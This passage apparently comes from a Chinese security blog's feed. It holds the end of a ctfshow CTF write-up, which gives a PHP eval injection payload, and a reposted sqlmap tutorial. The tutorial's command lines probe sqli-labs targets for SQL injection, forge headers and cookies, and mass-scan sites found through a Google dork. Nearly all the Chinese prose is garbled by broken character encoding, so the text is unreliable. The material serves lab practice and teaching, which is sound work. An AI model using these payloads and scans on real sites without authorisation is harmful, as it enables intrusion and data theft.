è¡¨ç¤ºåªæœ‰$v0&#x3D;1ï¼Œä¸”v2ä¸­ä¸èƒ½å«æœ‰åˆ†å·ï¼Œv3è¦æœ‰åˆ†å·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$v0</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br></code></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç ä¸­åªéœ€è¦v1æœ‰æ•°å­—å³å¯ï¼Œå› ä¸ºèµ‹å€¼æ“ä½œçš„ä¼˜å…ˆçº§å¤§äºand</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¼šæ‰§è¡Œæ‹¬å·é‡Œçš„å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ‹¬å·ä¸­çš„<code>$v2(&#39;ctfshow&#39;)$v3</code>æ¥æ„é€ å¯ä»¥è¾“å‡ºflagçš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in class ctfshow;</span><br></code></pre></td></tr></table></figure><p>ç”±é¢˜ç›®ä¸­çš„æ³¨é‡Šå¯çŸ¥flagåœ¨ctfshowä¸­ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦è¾“å‡ºctfshowå³å¯</p><p>getä¼ å‚ä¼ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022032011.png"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>æœ¬ç¯‡æ–‡ç« å‚è€ƒï¼šOWASPï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰</p><blockquote><p><a href="https://owasp.org/Top10/">https://owasp.org/Top10/</a></p></blockquote><blockquote><p>OWASPï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰æ˜¯ä¸€ä¸ªå¼€æ”¾çš„ç¤¾åŒºï¼Œç”±éè¥åˆ©ç»„ç»‡ OWASPåŸºé‡‘ä¼šæ”¯æŒçš„é¡¹ç›®ã€‚å¯¹æ‰€æœ‰è‡´åŠ›äºæ”¹è¿›åº”ç”¨ç¨‹åºå®‰å…¨çš„äººå£«å¼€æ”¾ï¼Œæ—¨åœ¨æé«˜å¯¹åº”ç”¨ç¨‹åºå®‰å…¨æ€§çš„è®¤è¯†ã€‚<br>å…¶æœ€å…·æƒå¨çš„å°±æ˜¯â€œ10é¡¹æœ€ä¸¥é‡çš„Web åº”ç”¨ç¨‹åºå®‰å…¨é£é™©åˆ—è¡¨â€ ï¼Œæ€»ç»“å¹¶æ›´æ–°Webåº”ç”¨ç¨‹åºä¸­æœ€å¯èƒ½ã€æœ€å¸¸è§ã€æœ€å±é™©çš„åå¤§æ¼æ´ï¼Œæ˜¯å¼€å‘ã€æµ‹è¯•ã€æœåŠ¡ã€å’¨è¯¢äººå‘˜åº”çŸ¥åº”ä¼šçš„çŸ¥è¯†ã€‚<br>æœ€é‡è¦çš„ç‰ˆæœ¬<br>åº”ç”¨ç¨‹åºä¸­æœ€ä¸¥é‡çš„åå¤§é£é™©<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p><p><strong>èµ„æ–™ï¼š</strong></p><p>é€šè¿‡ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼šOWASPä»£ç å®¡è®¡æŒ‡å—v2.0_ä¸­æ–‡ç‰ˆ_åˆ˜ä¼ å…´&amp;å­™ç»´åº·.pdf<br>é“¾æ¥: <a href="https://pan.baidu.com/s/19E7tec4WmZ_IVVkanf3uxQ">https://pan.baidu.com/s/19E7tec4WmZ_IVVkanf3uxQ</a> æå–ç : e86b<br>â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v4çš„åˆ†äº«</p></blockquote><p><a href="https://www.cnblogs.com/yzloo/p/10391078.html">åå¤§å¸¸è§webæ¼æ´åŠé˜²èŒƒ - yzloo - åšå®¢å›­</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´ç»ƒä¹ ï¼Œé¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmapå‘½ä»¤è¯¦è§£</title>
    <link href="/2025/11/02/sqlmap%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/02/sqlmap%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmapå‘½ä»¤è¯¦è§£"><a href="#sqlmapå‘½ä»¤è¯¦è§£" class="headerlink" title="sqlmapå‘½ä»¤è¯¦è§£"></a>sqlmapå‘½ä»¤è¯¦è§£</h1><blockquote><p>è½¬è½½è‡ªï¼š <a href="https://cloud.tencent.com/developer/user/8223537">å…¨æ ˆç¨‹åºå‘˜ç«™é•¿</a>      åŸæ–‡ï¼š<a href="https://cloud.tencent.com/developer/article/2148285">https://cloud.tencent.com/developer/article/2148285</a></p></blockquote><h2 id="0x01-sqlmap-ç¡®å®šç›®æ ‡"><a href="#0x01-sqlmap-ç¡®å®šç›®æ ‡" class="headerlink" title="0x01 sqlmap ç¡®å®šç›®æ ‡"></a>0x01 sqlmap ç¡®å®šç›®æ ‡</h2><h3 id="1-1-ç›´è¿æ•°æ®åº“"><a href="#1-1-ç›´è¿æ•°æ®åº“" class="headerlink" title="1.1 ç›´è¿æ•°æ®åº“"></a>1.1 ç›´è¿æ•°æ®åº“</h3><p>sqlmapæ”¯æŒç›´æ¥è¿æ¥æ•°æ®åº“ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ç›´è¿</p><p>æœåŠ¡å‹æ•°æ®åº“ï¼ˆå‰æçŸ¥é“æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç ï¼‰ DBMS:&#x2F;&#x2F;USER:PASSWORD@DBMS_PORT&#x2F;DATABASE_NAME ï¼ˆMySQLï¼ŒOracleï¼ŒMicrosoft SQL Serverï¼ŒPostgreSQLï¼Œetcï¼‰</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -d â€œmysql:&#x2F;&#x2F;admin:<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#49;&#x2e;&#x32;">admin@192.168.1.2</a>:3306&#x2F;securityâ€ -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020546.png" alt="img"></p><p>æ–‡ä»¶å‹æ•°æ®åº“ï¼ˆå‰æçŸ¥é“æ•°æ®åº“çš„ç»å¯¹è·¯å¾„ï¼‰ DBMS:&#x2F;&#x2F;DATABASE_FILEPATH (SQLiteï¼ŒMicrosoft Accessï¼ŒFire birdï¼Œetc)</p><h3 id="1-2-URLæ¢æµ‹"><a href="#1-2-URLæ¢æµ‹" class="headerlink" title="1.2 URLæ¢æµ‹"></a>1.2 URLæ¢æµ‹</h3><p>sqlmapç›´æ¥å¯¹å•ä¸€URLæ¢æµ‹ï¼Œä½¿ç”¨å‚æ•° -u æˆ– â€“url URLæ ¼å¼ï¼šhttp(s): &#x2F;&#x2F;targeturl [:port] &#x2F;[â€¦]</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u <a href="http://www.target/vuln.php?id=1">http://www.target/vuln.php?id=1</a> â€“banner</p><h3 id="1-3-æ–‡ä»¶è¯»å–ç›®æ ‡"><a href="#1-3-æ–‡ä»¶è¯»å–ç›®æ ‡" class="headerlink" title="1.3 æ–‡ä»¶è¯»å–ç›®æ ‡"></a>1.3 æ–‡ä»¶è¯»å–ç›®æ ‡</h3><p>sqlmapæ”¯æŒä»ä¸åŒç±»å‹çš„æ–‡ä»¶ä¸­è¯»å–ç›®æ ‡è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹ 1ã€-l ä»BurpSuite Proxyæˆ–ä»WebScarab Proxyä¸­è¯»å–HTTPè¯·æ±‚æ—¥å¿— </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020148.png" alt="img"></p><p> æŸ¥çœ‹burpsuiteæŠ“å–çš„æ—¥å¿—ä¿¡æ¯ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020092.png" alt="img"></p><p> ä½¿ç”¨sqlmapè¿›è¡Œæ¼”ç¤º </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021326.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020052.png" alt="img"></p><p>2ã€-x ä»sitemap.xmlç«™ç‚¹åœ°å›¾æ–‡ä»¶ä¸­è¯»å–ç›®æ ‡æ¢æµ‹</p><p>3ã€-m ä»å¤šè¡Œæ–‡æœ¬æ ¼å¼æ–‡ä»¶è¯»å–å¤šä¸ªç›®æ ‡</p><p>4ã€-r ä»æ–‡æœ¬æ–‡ä»¶ä¸­è¯»å–HTTPè¯·æ±‚ä½œä¸ºSQLæ³¨å…¥æ¢æµ‹ç›®æ ‡ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021903.png" alt="img"></p><p> å°†burp suiteæŠ“å–çš„HTTPè¯·æ±‚ä¿¡æ¯ï¼Œå¤åˆ¶åˆ°txtæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨sqlmap -r â€˜txtæ–‡ä»¶â€™ è¿›è¡Œæ¢æµ‹</p><p>5ã€-c ä»é…ç½®æ–‡ä»¶ sqlmap.conf ä¸­è¯»å–ç›®æ ‡æ¢æµ‹ æŸ¥çœ‹sqlmap.conf æ–‡ä»¶çš„å†…å®¹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021918.png" alt="img"></p><p> å°†æƒ³è¦æ¢æµ‹ç›®æ ‡çš„urlå¡«å…¥è¯¥æ–‡ä»¶ä¸­ï¼Œé‡Œé¢ä¹Ÿå¯ä»¥é€šè¿‡æ—¥å¿—æ–‡ä»¶å½¢å¼ï¼ˆç›¸å½“äºä½¿ç”¨ -l å‚æ•°ï¼‰ã€HTTPè¯·æ±‚æ–‡ä»¶ï¼ˆç›¸å½“äºä½¿ç”¨ -r å‚æ•°ï¼‰è¿›è¡Œæ¢æµ‹ï¼Œè¿˜å¯ä»¥è®¾ç½®å…¶ä»–å‚æ•°ï¼Œä¾‹å¦‚ï¼šmethod(HTTPè¯·æ±‚æ–¹æ³•)ã€dataï¼ˆæŒ‡å®šPOSTæäº¤çš„æ•°æ®ï¼‰ç­‰ç­‰</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ç›®æ ‡urlå¡«å…¥sqlmap.confæ–‡ä»¶ï¼Œè¿›è¡Œæ¼”ç¤º python sqlmap.py -c sqlmap.conf â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020660.png" alt="img"></p><h3 id="1-4-Google-æ‰¹é‡æ‰«ææ³¨å…¥"><a href="#1-4-Google-æ‰¹é‡æ‰«ææ³¨å…¥" class="headerlink" title="1.4 Google æ‰¹é‡æ‰«ææ³¨å…¥"></a>1.4 Google æ‰¹é‡æ‰«ææ³¨å…¥</h3><p>sqlmapé€šè¿‡ -g è‡ªåŠ¨åˆ©ç”¨Googleè·å–æŒ‡å®šGoogle hackçš„ç›®æ ‡ï¼Œç„¶ååˆ©ç”¨äº¤äº’å‘å¯¼æ¨¡å¼è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -g â€œinurl:.php?id&#x3D;â€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020037.png" alt="img"></p><h2 id="0x02-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰"><a href="#0x02-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰" class="headerlink" title="0x02 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰"></a>0x02 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆä¸€ï¼‰</h2><h3 id="2-1-è®¾ç½®-HTTP-æ–¹æ³•"><a href="#2-1-è®¾ç½®-HTTP-æ–¹æ³•" class="headerlink" title="2.1 è®¾ç½® HTTP æ–¹æ³•"></a>2.1 è®¾ç½® HTTP æ–¹æ³•</h3><p>Sqlmapä¼šè‡ªåŠ¨åœ¨æ¢æµ‹è¿‡ç¨‹ä¸­ä½¿ç”¨é€‚åˆçš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä½†æ˜¯åœ¨æŸäº›å…·ä½“æƒ…å†µä¸‹ï¼Œéœ€è¦å¼ºåˆ¶ä½¿ç”¨å…·ä½“çš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä¾‹å¦‚ PUTè¯·æ±‚æ–¹æ³•ã€‚HTTP PUTè¯·æ±‚æ–¹æ³•ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬å¼ºåˆ¶æŒ‡å®šã€‚ä½¿ç”¨ â€“method&#x3D;PUTã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021919.png" alt="img"></p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“method&#x3D;get â€“banner</p><h3 id="2-2-è®¾ç½®-POST-æäº¤å‚æ•°"><a href="#2-2-è®¾ç½®-POST-æäº¤å‚æ•°" class="headerlink" title="2.2 è®¾ç½® POST æäº¤å‚æ•°"></a>2.2 è®¾ç½® POST æäº¤å‚æ•°</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç”¨äºæ‰§è¡ŒHTTPè¯·æ±‚çš„HTTPæ–¹æ³•æ˜¯GETï¼Œä½†æ˜¯æ‚¨å¯ä»¥é€šè¿‡æä¾›åœ¨POSTè¯·æ±‚ä¸­å‘é€çš„æ•°æ®éšå¼åœ°å°†å…¶æ›´æ”¹ä¸ºPOSTã€‚è¿™äº›æ•°æ®ä½œä¸ºè¿™äº›å‚æ•°ï¼Œè¢«ç”¨äºSQLæ³¨å…¥æ£€æµ‹ã€‚ ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.phpâ€</a> â€“data&#x3D;â€œid&#x3D;1â€ -f â€“banner â€“dbs â€“users</p><p>-f fingerprint æŒ‡çº¹</p><p>æ¼”ç¤ºï¼š python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/â€</a> â€“data&#x3D;â€œuname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitâ€ -p uname -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020309.png" alt="img"></p><h3 id="2-3-è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦"><a href="#2-3-è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦" class="headerlink" title="2.3 è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦"></a>2.3 è®¾ç½®å‚æ•°åˆ†å‰²ç¬¦</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œsqlmapéœ€è¦è¦†ç›–é»˜è®¤å‚æ•°åˆ†éš”ç¬¦(ä¾‹å¦‚&amp; in GETå’ŒPOSTæ•°æ®)ï¼Œæ‰èƒ½æ­£ç¡®åœ°åˆ†å‰²å’Œå•ç‹¬å¤„ç†æ¯ä¸ªå‚æ•°ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://www.target.com/vuln.php%E2%80%9D">http://www.target.com/vuln.phpâ€</a> â€“data&#x3D;â€œquery&#x3D;foobar;id&#x3D;1â€ â€“param-del&#x3D;â€;â€ -f â€“banner â€“dbs â€“users</p><p>æ¼”ç¤ºï¼š python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/â€</a> â€“data&#x3D;uname&#x3D;â€œadmin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitâ€ â€“param-del&#x3D;â€&amp;â€ -p uname -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020662.png" alt="img"></p><h3 id="2-4-è®¾ç½®Cookie-å¤´"><a href="#2-4-è®¾ç½®Cookie-å¤´" class="headerlink" title="2.4 è®¾ç½®Cookie å¤´"></a>2.4 è®¾ç½®Cookie å¤´</h3><p>Sqlmapä¸­ç”¨æ¥è®¾ç½®Cookieçš„å‚æ•°ï¼šâ€“cookie, â€“cookie-del, â€“load-cookies â€“drop-set-cookie </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021972.png" alt="img"></p><p>ä½¿ç”¨åœºæ™¯ï¼š 1ã€Webåº”ç”¨ç¨‹åºå…·æœ‰åŸºäºCookieéªŒè¯çš„è¿‡ç¨‹ï¼› 2ã€æƒ³åˆ©ç”¨Cookieå€¼ä¸Šçš„SQLæ³¨å…¥æ¼æ´ã€‚</p><p>Sqlmapä½¿ç”¨Cookieè¿‡ç¨‹ï¼š 1ã€ç™»å½•æˆ–æµè§ˆé¡µé¢ã€‚ 2ã€æ‰“å¼€å®¡è®¡å·¥å…·æˆ–ä»£ç†æˆªæ–­ï¼Œå¤åˆ¶Cookieã€‚ 3ã€åœ¨Sqlmapä¸­ä½¿ç”¨ â€“cookie ç²˜è´´Cookieã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022021255.png" alt="img"></p><p> python sqlmap.py -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-11/%E2%80%9D">http://192.168.1.2/sqlilabs/Less-11/â€</a> â€“data&#x3D;â€œuname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitâ€ -p uname -f â€“banner </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020973.png" alt="img"></p><p>å¦‚æœåœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œwebåº”ç”¨ç¨‹åºä½¿ç”¨Set-Cookieæ ‡å¤´è¿›è¡Œå“åº”ï¼Œsqlmapå°†åœ¨æ‰€æœ‰è¿›ä¸€æ­¥çš„HTTPè¯·æ±‚ä¸­è‡ªåŠ¨ä½¿ç”¨å…¶å€¼ä½œä¸ºCookieæ ‡å¤´ã€‚sqlmapè¿˜å°†ä¸ºSQLæ³¨å…¥è‡ªåŠ¨æµ‹è¯•è¿™äº›å€¼ã€‚è¿™å¯ä»¥é€šè¿‡æä¾›â€“drop-set-cookieâ€”sqlmapå°†å¿½ç•¥ä»»ä½•å³å°†åˆ°æ¥çš„Set-Cookieå¤´æ¥é¿å…ã€‚ åä¹‹äº¦ç„¶ï¼Œå¦‚æœæ‚¨æä¾›äº†ä¸€ä¸ªå¸¦æœ‰é€‰é¡¹çš„HTTP CookieæŠ¥å¤´â€”Cookieå’Œç›®æ ‡URLåœ¨ä»»ä½•æ—¶å€™å‘é€ä¸€ä¸ªHTTP set -CookieæŠ¥å¤´ï¼Œsqlmapå°†è¯¢é—®æ‚¨è¦ä¸ºä»¥ä¸‹HTTPè¯·æ±‚ä½¿ç”¨å“ªç»„Cookieã€‚</p><p>load-cookieï¼Œå¯ä»¥ç”¨æ¥æä¾›åŒ…å«Netscape&#x2F;wgetæ ¼å¼çš„cookieçš„ç‰¹æ®Šæ–‡ä»¶</p><p>æ³¨æ„ï¼šå¦‚æœéœ€è¦å¯¹HTTP Cookieå€¼è¿›è¡ŒSQLæ³¨å…¥æ¢æµ‹ï¼Œéœ€è¦è®¾ç½® â€“level 2ä»¥ä¸Šï¼ˆ3ï¼‰ã€‚</p><h3 id="2-5-è®¾ç½®-User-Agent-å¤´"><a href="#2-5-è®¾ç½®-User-Agent-å¤´" class="headerlink" title="2.5 è®¾ç½® User-Agent å¤´"></a>2.5 è®¾ç½® User-Agent å¤´</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ sqlmapä½¿ç”¨ä»¥ä¸‹ç”¨æˆ·ä»£ç†å¤´å€¼æ‰§è¡ŒHTTPè¯·æ±‚: sqlmap&#x2F;1.0-dev-xxxxxxx (<a href="http://sqlmap.org/">http://sqlmap.org</a>) ï¼ˆä½¿ç”¨Wireshark æŠ“åŒ…æŸ¥çœ‹ï¼‰ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020307.png" alt="img"></p><p> ç„¶è€Œï¼Œ é€šè¿‡æä¾›è‡ªå®šä¹‰ç”¨æˆ·ä»£ç†ä½œä¸ºé€‰é¡¹çš„å‚æ•°ï¼Œ å¯ä»¥ä½¿ç”¨é€‰é¡¹â€”user-agentæ¥ä¼ªé€ å®ƒã€‚ï¼ˆå¯ä½¿ç”¨burpsuiteæŠ“å–æ­£å¸¸çš„HTTPè¯·æ±‚åŒ…è·å–User-Agentå¤´çš„ä¿¡æ¯ï¼‰</p><p>sqlmap -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“user-agent â€ Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0â€³ å†æ¬¡æŠ“åŒ…æŸ¥çœ‹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022685.png" alt="img"></p><p> æ­¤å¤–ï¼Œ é€šè¿‡ â€“random-agent, sqlmapå°†ä».&#x2F;txt&#x2F;user-agentä¸­éšæœºé€‰æ‹©ä¸€ä¸ªç”¨äºä¼šè¯ä¸­çš„æ‰€æœ‰HTTPè¯·æ±‚ã€‚ä¸€äº›ç«™ç‚¹åœ¨æœåŠ¡ç«¯æ£€æµ‹HTTP User-Agentå€¼ï¼Œ å¦‚æœä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„å€¼ï¼Œ å°±ä¼šä¸­æ–­è¿æ¥ã€‚ åŒæ—¶Sqlmapä¹Ÿä¼šæ›å‡ºé”™è¯¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022826.png" alt="img"></p><p> æ¼”ç¤ºï¼š sqlmap -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“random-agent æŠ“åŒ…æŸ¥çœ‹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020339.png" alt="img"></p><p>æ³¨æ„é’ˆå¯¹User-Agentçš„å€¼æ¢æµ‹SQLæ³¨å…¥ï¼Œ éœ€è¦è®¾ç½®â€“level å€¼ä¸º3ã€‚æˆ–è€…ï¼Œä½¿ç”¨Burp SuiteæŠ“åŒ…ï¼Œå°†HTTPè¯·æ±‚ä¿¡æ¯å¤åˆ¶åˆ°txtæ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨è¦User-Agentå¤´çš„åé¢åŠ ä¸Šä¸€ä¸ª * å·ï¼Œè¿™æ ·ä¸ä½¿ç”¨â€”level 3 ä¹Ÿèƒ½å¤Ÿå¯¹User-Agentå¤´è¿›è¡Œæ¢æµ‹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022473.png" alt="img"></p><h3 id="2-6-è®¾ç½®-Host-å¤´"><a href="#2-6-è®¾ç½®-Host-å¤´" class="headerlink" title="2.6 è®¾ç½® Host å¤´"></a>2.6 è®¾ç½® Host å¤´</h3><p>å¯ä»¥æ‰‹åŠ¨è®¾ç½®HTTPä¸»æœºå¤´å€¼ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œ ä»æä¾›çš„ç›®æ ‡URLè§£æHTTPä¸»æœºå¤´ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020559.png" alt="img"></p><p> æ³¨æ„ï¼Œ å¦‚æœ â€“levelè®¾ç½®ä¸º5,å°†å¯¹HTTPä¸»æœºå¤´è¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ã€‚</p><h3 id="2-7-è®¾ç½®-Referer-å¤´"><a href="#2-7-è®¾ç½®-Referer-å¤´" class="headerlink" title="2.7 è®¾ç½® Referer å¤´"></a>2.7 è®¾ç½® Referer å¤´</h3><p>ä¼ªé€ HTTP Refererå€¼æ˜¯å¯èƒ½çš„ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œ å¦‚æœæ²¡æœ‰æ˜¾å¼è®¾ç½®ï¼Œ HTTPè¯·æ±‚ä¸­ä¸ä¼šå‘é€HTTPå¼•ç”¨å¤´ã€‚ è¯·æ³¨æ„ï¼Œ å¦‚æœâ€“levelè®¾ç½®ä¸º3æˆ–ä»¥ä¸Šï¼Œ å°†é’ˆå¯¹HTTPå¼•ç”¨å¤´ è¿›è¡ŒSQLæ³¨å…¥æµ‹è¯•ï¼ˆæˆ–åœ¨è¯·æ±‚ä¿¡æ¯ä¸­è¦è¿›è¡Œæ¢æµ‹çš„ä½ç½®åé¢åŠ ä¸Š*å·ï¼‰ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020440.png" alt="img"></p><h3 id="2-8-è®¾ç½®-é¢å¤–-HTTP-å¤´"><a href="#2-8-è®¾ç½®-é¢å¤–-HTTP-å¤´" class="headerlink" title="2.8 è®¾ç½® é¢å¤– HTTP å¤´"></a>2.8 è®¾ç½® é¢å¤– HTTP å¤´</h3><p>é€šè¿‡è®¾ç½®é€‰é¡¹â€“headerï¼Œ å¯ä»¥æä¾›é¢å¤–çš„HTTPæ ‡å¤´ã€‚ æ¯ä¸ªæ ‡å¤´å¿…é¡»ç”¨æ¢è¡Œç¬¦ï¼ˆ\nï¼‰åˆ†éš”ï¼Œ ä»é…ç½®INIæ–‡ä»¶ä¸­æä¾›å®ƒä»¬è¦å®¹æ˜“å¾—å¤šã€‚ å¯ä»¥æŸ¥çœ‹ç¤ºä¾‹sqlmap.confæ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1â€</a> â€“headers&#x3D;â€œHost:<a href="http://www.target.com/nUser-agent:Firefox">www.target.com\nUser-agent:Firefox</a> 1.0â€ -v 5</p><p>ä»¥Sqli-Labsé¶åœºçš„Sqli-Less1ä¸ºä¾‹ å°†User-Agentè®¾ä¸ºï¼šhaha å°†cookieè®¾ä¸º:heihei</p><p>sqlmap -u â€œ<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1â€</a> â€“headers&#x3D;â€œuser-agent:haha\ncookie:heiheiâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020619.png" alt="img"></p><h3 id="2-9-è®¾ç½®-HTTP-åè®®è®¤è¯"><a href="#2-9-è®¾ç½®-HTTP-åè®®è®¤è¯" class="headerlink" title="2.9 è®¾ç½® HTTP åè®®è®¤è¯"></a>2.9 è®¾ç½® HTTP åè®®è®¤è¯</h3><p>Sqlmapä¸­è®¾ç½®HTTPåè®®è®¤è¯çš„å‚æ•°ï¼š â€“auth-typeå’Œâ€“auth-cred</p><p>å…¶ä¸­â€“auth-typeæ”¯æŒ Basicã€ Digestã€ NTLM</p><p>â€“auth-credè®¤è¯è¯­æ³•ä¸ºï¼š username:password ï¼ˆç”¨äºéœ€è¦è´¦å·å¯†ç ç™»å½•çš„é¡µé¢ï¼‰</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://url/arit.php?id=1%E2%80%9D">http://url/arit.php?id=1â€</a> 